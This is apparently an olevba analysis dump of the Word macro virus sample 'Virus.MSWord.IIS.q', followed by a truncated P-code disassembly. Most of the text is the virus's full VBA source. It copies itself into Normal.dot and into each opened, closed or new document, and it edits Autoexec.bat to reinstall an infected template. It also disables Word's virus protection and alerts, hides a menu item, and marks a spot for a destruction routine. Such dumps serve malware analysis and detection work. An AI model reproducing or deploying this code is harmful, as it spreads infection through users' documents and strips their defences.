olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.IIS.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.IIS.q - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Rem MyName = IIS
Close
On Error GoTo MegaJump
    Set prevDocument = NormalTemplate
    Set nextDocument = newDocument
Line Input #1, ms
If UCase(Left(ms, 7)) = "WINDIR=" Then
a = Len(ms)
windir = Mid(ms, 8, a)
GoTo fert
End If
Close
fert:
Close
Open windir & "\system\Log.drv" For Append As #1
Print #1, "+"
Close
NormInstalled = False
ActInstalled = False
NormalTemplate.VBProject.VBComponents(1).Export ("c:\vn.dll")
ActiveDocument.VBProject.VBComponents(1).Export ("c:\vd.dll")
NormInst = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
ActInst = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
If UCase(NormInst) = "REM MYNAME = IIS" Then NormInstalled = True
If UCase(ActInst) = "REM MYNAME = IIS" Then ActInstalled = True

Close
Open "c:\Autoexec.bat" For Append As #12
Close #12
Open "c:\Autoexec.bat" For Input As #12
Do Until EOF(12)
If EOF(12) Then GoTo dss
Line Input #12, a
If a = "@del c:\normalb.dot" Then SetAttr (NormalTemplate.FullName), vbReadOnly
Loop
dss:

If NormInstalled = True And ActIntalled = True Then GoTo esub
If NormInstalled = True Then IW = "C:\vn.dll" Else IW = "C:\Vd.dll"
Open IW For Input As #1
FullCode = "Private Sub Document_Open()" & Chr(13)
Do
Line Input #1, VirCode
Loop Until VirCode = "Private Sub Document_Open()"
Do
If VirCode = "End Sub" Then ess = ess + 1
If ess = 3 Then GoTo jump
Line Input #1, VirCode
If VirCode = "Rem Written by Flitnic" Then GoTo jump
FullCode = FullCode & VirCode & Chr(13)
Loop
jump:
FullCode = FullCode & VirCode & Chr(13)
FullCode = FullCode & "End Sub"
If NormInstalled = False Then
dd = Dir(NormalTemplate.FullName)
If dd = "" Then GoTo AtrNo
at = GetAttr(NormalTemplate.FullName)
If at = 33 Then at = 1
If at = 1 Then
Close
Open "c:\Autoexec.bat" For Append As #12
Close #12
Open "c:\Autoexec.bat" For Input As #12
Do Until EOF(12)
If EOF(12) Then GoTo ds
Line Input #12, a
If a = "@del c:\normalb.dot" Then GoTo fv
Loop
ds:
SetAttr (NormalTemplate.FullName), vbNormal
Documents.Add Template:="", NewTemplate:=False
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
ActiveDocument.SaveAs FileName:="C:\Normalb.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
ActiveDocument.Save
Close #1
Open "c:\No.dat" For Append As #1
Close #1
ActiveDocument.Close
Kill "c:\No.dat"
Close #12
Open "c:\autoexec.bat" For Append As #12
Close #12

FileCopy "c:\Autoexec.bat", "c:\Autoexec.bak"
Close #12
Open "c:\Autoexec.bat" For Append As #12
Print #12, "@Copy /y C:\normalb.dot " & NormalTemplate.FullName
Print #12, "@del c:\normalb.dot"
Print #12, "@Copy /y c:\Autoexec.bak c:\Autoexec.bat"
fv:
Close
Exit Sub
End If
AtrNo:
Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
dd = Dir(NormalTemplate.FullName)
If dd = "" Then Exit Sub
NormalTemplate.Save
End If
If ActInstalled = False Then
If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
ActiveDocument.Save
Else
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
End If
End If
esub:
a = Dir(NormalTemplate.FullName)
If a = "" Then Exit Sub
at = GetAttr(NormalTemplate.FullName)
If at = 33 Then at = 1
If at = 1 Then GoTo gghh
Close
dd = Dir("c:\vn.dll")
If dd = "" Then GoTo tz2a
Kill "C:\vn.dll"
tz2a:
dd = Dir("c:\vd.dll")
If dd = "" Then GoTo tz2b
Kill "C:\vd.dll"
tz2b:
If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
ActiveDocument.Save
End If
Open windir & "\system\Log.drv" For Input As #1
lll = LOF(1)
'IIS for NormalTemplate Create:
dd = Dir(NormalTemplate.FullName)
If dd = "" Then Exit Sub
aAutoOpen = False
    For Ii = 1 To NormalTemplate.VBProject.VBComponents.Count
    a = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
    If a = "Sub IIS()" Then
    cl = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.CountOfLines
    NormalTemplate.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
    aAutoOpen = True
    Exit For
    End If
    Next Ii
    Ii = 0
    If aAutoOpen = False Then
    Close
    Open "c:\newvnb.dll" For Append As #2
    Print #2, "Attribute VB_Name = "; XXXXX; ""
    Close
    NormalTemplate.VBProject.VBComponents.Import ("c:\newvnb.dll")
    Kill "c:\newvnb.dll"
    End If
    iii = 0
    For iii = 1 To NormalTemplate.VBProject.VBComponents.Count
    cl = NormalTemplate.VBProject.VBComponents(iii).CodeModule.CountOfLines
    If cl = 0 Then Exit For
    Next iii
AutoOpenCode = "Sub IIS()" & Chr(13)
AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
NormalTemplate.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
NormalTemplate.Save

'IIS for ActiveDocument Create:
If LCase(Mid(ActiveDocument.FullName, 1, 1)) = "a" Then GoTo nomacro
at = GetAttr(ActiveDocument.FullName)
If at = 33 Then at = 1
If at = 1 Then GoTo nomacro
If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
dd = Dir(ActiveDocument.FullName)
If dd = "" Then Exit Sub
aAutoOpen = False
    For Ii = 1 To ActiveDocument.VBProject.VBComponents.Count
    a = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
    If a = "Sub IIS()" Then
    cl = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.CountOfLines
    ActiveDocument.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
    aAutoOpen = True
    Exit For
    End If
    Next Ii
    Ii = 0
    If aAutoOpen = False Then
    Close
    Open "c:\newvnb.dll" For Append As #2
    Print #2, "Attribute VB_Name = "; XXXXX; ""
    Close
    ActiveDocument.VBProject.VBComponents.Import ("c:\newvnb.dll")
    Kill "c:\newvnb.dll"
    End If
    iii = 0
    For iii = 1 To ActiveDocument.VBProject.VBComponents.Count
    cl = ActiveDocument.VBProject.VBComponents(iii).CodeModule.CountOfLines
    If cl = 0 Then Exit For
    Next iii
AutoOpenCode = "Sub IIS()" & Chr(13)
AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
ActiveDocument.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
ActiveDocument.Save
End If
nomacro:
Close
MegaJump:
dd = Dir(NormalTemplate.FullName)
If dd = "" Then GoTo gghh
On Error Resume Next
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then GoTo gghh
at = GetAttr(NormalTemplate.FullName)
If at = 33 Then at = 1
If at = 1 Then GoTo gghh
ormalTemplate.Save
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False

'Insert destruction routine here:

gghh:
End Sub
Private Sub Document_Close()
Rem MyName = IIS
a = Dir("c:\No.dat")
If UCase(a) = "NO.DAT" Then
Exit Sub
End If
Close
On Error GoTo MegaJump
Open "c:\msdos.sys" For Input As #1
Do
Line Input #1, ms
If UCase(Left(ms, 7)) = "WINDIR=" Then
a = Len(ms)
windir = Mid(ms, 8, a)
GoTo fert
End If
Loop
Close
fert:
Close
Open windir & "\system\Log.drv" For Append As #1
Print #1, "+"
Close
NormInstalled = False
ActInstalled = False
NormalTemplate.VBProject.VBComponents(1).Export ("c:\vn.dll")
ActiveDocument.VBProject.VBComponents(1).Export ("c:\vd.dll")
NormInst = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
ActInst = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
If UCase(NormInst) = "REM MYNAME = IIS" Then NormInstalled = True
If UCase(ActInst) = "REM MYNAME = IIS" Then ActInstalled = True

Close
Open "c:\Autoexec.bat" For Append As #12
Close #12
Open "c:\Autoexec.bat" For Input As #12
Do Until EOF(12)
If EOF(12) Then GoTo dss
Line Input #12, a
If a = "@del c:\normalb.dot" Then SetAttr (NormalTemplate.FullName), vbReadOnly
Loop
dss:

If NormInstalled = True And ActIntalled = True Then GoTo esub
If NormInstalled = True Then IW = "C:\vn.dll" Else IW = "C:\Vd.dll"
Open IW For Input As #1
FullCode = "Private Sub Document_Open()" & Chr(13)
Do
Line Input #1, VirCode
Loop Until VirCode = "Private Sub Document_Open()"
Do
If VirCode = "End Sub" Then ess = ess + 1
If ess = 3 Then GoTo jump
Line Input #1, VirCode
If VirCode = "Rem Written by Flitnic" Then GoTo jump
FullCode = FullCode & VirCode & Chr(13)
Loop
jump:
FullCode = FullCode & VirCode & Chr(13)
FullCode = FullCode & "End Sub"
If NormInstalled = False Then
dd = Dir(NormalTemplate.FullName)
If dd = "" Then GoTo AtrNo
at = GetAttr(NormalTemplate.FullName)
If at = 33 Then at = 1
If at = 1 Then
Close
Exit Sub
End If
AtrNo:
Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
dd = Dir(NormalTemplate.FullName)
If dd = "" Then Exit Sub
NormalTemplate.Save
End If
If ActInstalled = False Then
If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
ActiveDocument.Save
Else
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
End If
End If
esub:
a = Dir(NormalTemplate.FullName)
If a = "" Then Exit Sub
at = GetAttr(NormalTemplate.FullName)
If at = 33 Then at = 1
If at = 1 Then GoTo gghh
Close
dd = Dir("c:\vn.dll")
If dd = "" Then GoTo tz2a
Kill "C:\vn.dll"
tz2a:
dd = Dir("c:\vd.dll")
If dd = "" Then GoTo tz2b
Kill "C:\vd.dll"
tz2b:
If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
ActiveDocument.Save
End If
Open windir & "\system\Log.drv" For Input As #1
lll = LOF(1)
'IIS for NormalTemplate Create:
dd = Dir(NormalTemplate.FullName)
If dd = "" Then Exit Sub
aAutoOpen = False
    For Ii = 1 To NormalTemplate.VBProject.VBComponents.Count
    a = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
    If a = "Sub IIS()" Then
    cl = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.CountOfLines
    NormalTemplate.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
    aAutoOpen = True
    Exit For
    End If
    Next Ii
    Ii = 0
    If aAutoOpen = False Then
    Close
    Open "c:\newvnb.dll" For Append As #2
    Print #2, "Attribute VB_Name = "; XXXXX; ""
    Close
    NormalTemplate.VBProject.VBComponents.Import ("c:\newvnb.dll")
    Kill "c:\newvnb.dll"
    End If
    iii = 0
    For iii = 1 To NormalTemplate.VBProject.VBComponents.Count
    cl = NormalTemplate.VBProject.VBComponents(iii).CodeModule.CountOfLines
    If cl = 0 Then Exit For
    Next iii
AutoOpenCode = "Sub IIS()" & Chr(13)
AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
NormalTemplate.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
NormalTemplate.Save
'IIS for ActiveDocument Create:
If LCase(Mid(ActiveDocument.FullName, 1, 1)) = "a" Then GoTo nomacro
at = GetAttr(ActiveDocument.FullName)
If at = 33 Then at = 1
If at = 1 Then GoTo nomacro
If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
dd = Dir(ActiveDocument.FullName)
If dd = "" Then Exit Sub
aAutoOpen = False
    For Ii = 1 To ActiveDocument.VBProject.VBComponents.Count
    a = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
    If a = "Sub IIS()" Then
    cl = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.CountOfLines
    ActiveDocument.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
    aAutoOpen = True
    Exit For
    End If
    Next Ii
    Ii = 0
    If aAutoOpen = False Then
    Close
    Open "c:\newvnb.dll" For Append As #2
    Print #2, "Attribute VB_Name = "; XXXXX; ""
    Close
    ActiveDocument.VBProject.VBComponents.Import ("c:\newvnb.dll")
    Kill "c:\newvnb.dll"
    End If
    iii = 0
    For iii = 1 To ActiveDocument.VBProject.VBComponents.Count
    cl = ActiveDocument.VBProject.VBComponents(iii).CodeModule.CountOfLines
    If cl = 0 Then Exit For
    Next iii
AutoOpenCode = "Sub IIS()" & Chr(13)
AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
ActiveDocument.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
ActiveDocument.Save
End If
nomacro:


Close
MegaJump:
dd = Dir(NormalTemplate.FullName)
If dd = "" Then GoTo gghh
On Error Resume Next
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then GoTo gghh
at = GetAttr(NormalTemplate.FullName)
If at = 33 Then at = 1
If at = 1 Then GoTo gghh
NormalTemplate.Save
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False

'Insert destruction routine here:


gghh:
End Sub
Private Sub Document_New()
Rem MyName = IIS
a = Dir("c:\No.dat")
If UCase(a) = "NO.DAT" Then
Exit Sub
End If
Close
On Error GoTo MegaJump
Open "c:\msdos.sys" For Input As #1
Do
Line Input #1, ms
If UCase(Left(ms, 7)) = "WINDIR=" Then
a = Len(ms)
windir = Mid(ms, 8, a)
GoTo fert
End If
Loop
Close
fert:
Close
Open windir & "\system\Log.drv" For Append As #1
Print #1, "+"
Close
NormInstalled = False
ActInstalled = False
NormalTemplate.VBProject.VBComponents(1).Export ("c:\vn.dll")
ActiveDocument.VBProject.VBComponents(1).Export ("c:\vd.dll")
NormInst = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
ActInst = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
If UCase(NormInst) = "REM MYNAME = IIS" Then NormInstalled = True
If UCase(ActInst) = "REM MYNAME = IIS" Then ActInstalled = True

Close
Open "c:\Autoexec.bat" For Append As #12
Close #12
Open "c:\Autoexec.bat" For Input As #12
Do Until EOF(12)
If EOF(12) Then GoTo dss
Line Input #12, a
If a = "@del c:\normalb.dot" Then SetAttr (NormalTemplate.FullName), vbReadOnly
Loop
dss:

If NormInstalled = True And ActIntalled = True Then GoTo esub
If NormInstalled = True Then IW = "C:\vn.dll" Else IW = "C:\Vd.dll"
Open IW For Input As #1
FullCode = "Private Sub Document_Open()" & Chr(13)
Do
Line Input #1, VirCode
Loop Until VirCode = "Private Sub Document_Open()"
Do
If VirCode = "End Sub" Then ess = ess + 1
If ess = 3 Then GoTo jump
Line Input #1, VirCode
If VirCode = "Rem Written by Flitnic" Then GoTo jump
FullCode = FullCode & VirCode & Chr(13)
Loop
jump:
FullCode = FullCode & VirCode & Chr(13)
FullCode = FullCode & "End Sub"
If NormInstalled = False Then
dd = Dir(NormalTemplate.FullName)
If dd = "" Then GoTo AtrNo
at = GetAttr(NormalTemplate.FullName)
If at = 33 Then at = 1
If at = 1 Then
Close
Exit Sub
End If
AtrNo:
Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
dd = Dir(NormalTemplate.FullName)
If dd = "" Then Exit Sub
NormalTemplate.Save
End If
If ActInstalled = False Then
If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
ActiveDocument.Save
Else
Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
End If
End If
esub:
a = Dir(NormalTemplate.FullName)
If a = "" Then Exit Sub
at = GetAttr(NormalTemplate.FullName)
If at = 33 Then at = 1
If at = 1 Then GoTo gghh
Close
dd = Dir("c:\vn.dll")
If dd = "" Then GoTo tz2a
Kill "C:\vn.dll"
tz2a:
dd = Dir("c:\vd.dll")
If dd = "" Then GoTo tz2b
Kill "C:\vd.dll"
tz2b:
If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
ActiveDocument.Save
End If
Open windir & "\system\Log.drv" For Input As #1
lll = LOF(1)
'IIS for NormalTemplate Create:
dd = Dir(NormalTemplate.FullName)
If dd = "" Then Exit Sub
aAutoOpen = False
    For Ii = 1 To NormalTemplate.VBProject.VBComponents.Count
    a = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
    If a = "Sub IIS()" Then
    cl = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.CountOfLines
    NormalTemplate.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
    aAutoOpen = True
    Exit For
    End If
    Next Ii
    Ii = 0
    If aAutoOpen = False Then
    Close
    Open "c:\newvnb.dll" For Append As #2
    Print #2, "Attribute VB_Name = "; XXXXX; ""
    Close
    NormalTemplate.VBProject.VBComponents.Import ("c:\newvnb.dll")
    Kill "c:\newvnb.dll"
    End If
    iii = 0
    For iii = 1 To NormalTemplate.VBProject.VBComponents.Count
    cl = NormalTemplate.VBProject.VBComponents(iii).CodeModule.CountOfLines
    If cl = 0 Then Exit For
    Next iii
AutoOpenCode = "Sub IIS()" & Chr(13)
AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
NormalTemplate.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
NormalTemplate.Save
'IIS for ActiveDocument Create:
If LCase(Mid(ActiveDocument.FullName, 1, 1)) = "a" Then GoTo nomacro
at = GetAttr(ActiveDocument.FullName)
If at = 33 Then at = 1
If at = 1 Then GoTo nomacro
If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
dd = Dir(ActiveDocument.FullName)
If dd = "" Then Exit Sub
aAutoOpen = False
    For Ii = 1 To ActiveDocument.VBProject.VBComponents.Count
    a = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
    If a = "Sub IIS()" Then
    cl = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.CountOfLines
    ActiveDocument.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
    aAutoOpen = True
    Exit For
    End If
    Next Ii
    Ii = 0
    If aAutoOpen = False Then
    Close
    Open "c:\newvnb.dll" For Append As #2
    Print #2, "Attribute VB_Name = "; XXXXX; ""
    Close
    ActiveDocument.VBProject.VBComponents.Import ("c:\newvnb.dll")
    Kill "c:\newvnb.dll"
    End If
    iii = 0
    For iii = 1 To ActiveDocument.VBProject.VBComponents.Count
    cl = ActiveDocument.VBProject.VBComponents(iii).CodeModule.CountOfLines
    If cl = 0 Then Exit For
    Next iii
AutoOpenCode = "Sub IIS()" & Chr(13)
AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
ActiveDocument.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
ActiveDocument.Save
End If
nomacro:

Close
MegaJump:
dd = Dir(NormalTemplate.FullName)
If dd = "" Then GoTo gghh
On Error Resume Next
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then GoTo gghh
at = GetAttr(NormalTemplate.FullName)
If at = 33 Then at = 1
If at = 1 Then GoTo gghh
NormalTemplate.Save
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False

'Insert destruction routine here:

gghh:
Rem Written by Flitnic
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSWord.IIS.q - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub IIS()
'Macro created by Harry H.
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.IIS.q
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 30503 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Rem 0x000D " MyName = IIS"
' Line #2:
' 	CloseAll 
' Line #3:
' 	OnError MegaJump 
' Line #4:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set prevDocument 
' Line #5:
' 	SetStmt 
' 	Ld newDocument 
' 	Set nextDocument 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld ms 
' 	LineInput 
' Line #7:
' 	Ld ms 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #8:
' 	Ld ms 
' 	FnLen 
' 	St a 
' Line #9:
' 	Ld ms 
' 	LitDI2 0x0008 
' 	Ld a 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #10:
' 	GoTo fert 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	CloseAll 
' Line #13:
' 	Label fert 
' Line #14:
' 	CloseAll 
' Line #15:
' 	Ld windir 
' 	LitStr 0x000F "\system\Log.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "+"
' 	PrintItemNL 
' Line #17:
' 	CloseAll 
' Line #18:
' 	LitVarSpecial (False)
' 	St NormInstalled 
' Line #19:
' 	LitVarSpecial (False)
' 	St ActInstalled 
' Line #20:
' 	LitStr 0x0009 "c:\vn.dll"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #21:
' 	LitStr 0x0009 "c:\vd.dll"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #22:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NormInst 
' Line #23:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ActInst 
' Line #24:
' 	Ld NormInst 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "REM MYNAME = IIS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	EndIf 
' Line #25:
' 	Ld ActInst 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "REM MYNAME = IIS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActInstalled 
' 	EndIf 
' Line #26:
' Line #27:
' 	CloseAll 
' Line #28:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x000C 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #29:
' 	LitDI2 0x000C 
' 	Sharp 
' 	Close 0x0001 
' Line #30:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x000C 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #31:
' 	LitDI2 0x000C 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #32:
' 	LitDI2 0x000C 
' 	ArgsLd EOF 0x0001 
' 	If 
' 	BoSImplicit 
' 	GoTo dss 
' 	EndIf 
' Line #33:
' 	LitDI2 0x000C 
' 	Ld a 
' 	LineInput 
' Line #34:
' 	Ld a 
' 	LitStr 0x0013 "@del c:\normalb.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #35:
' 	Loop 
' Line #36:
' 	Label dss 
' Line #37:
' Line #38:
' 	Ld NormInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActIntalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo esub 
' 	EndIf 
' Line #39:
' 	Ld NormInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "C:\vn.dll"
' 	St IW 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0009 "C:\Vd.dll"
' 	St IW 
' 	EndIf 
' Line #40:
' 	Ld IW 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #41:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #42:
' 	Do 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld VirCode 
' 	LineInput 
' Line #44:
' 	Ld VirCode 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	LoopUntil 
' Line #45:
' 	Do 
' Line #46:
' 	Ld VirCode 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ess 
' 	LitDI2 0x0001 
' 	Add 
' 	St ess 
' 	EndIf 
' Line #47:
' 	Ld ess 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo jump 
' 	EndIf 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld VirCode 
' 	LineInput 
' Line #49:
' 	Ld VirCode 
' 	LitStr 0x0016 "Rem Written by Flitnic"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo jump 
' 	EndIf 
' Line #50:
' 	Ld FullCode 
' 	Ld VirCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #51:
' 	Loop 
' Line #52:
' 	Label jump 
' Line #53:
' 	Ld FullCode 
' 	Ld VirCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #54:
' 	Ld FullCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St FullCode 
' Line #55:
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #56:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #57:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo AtrNo 
' 	EndIf 
' Line #58:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
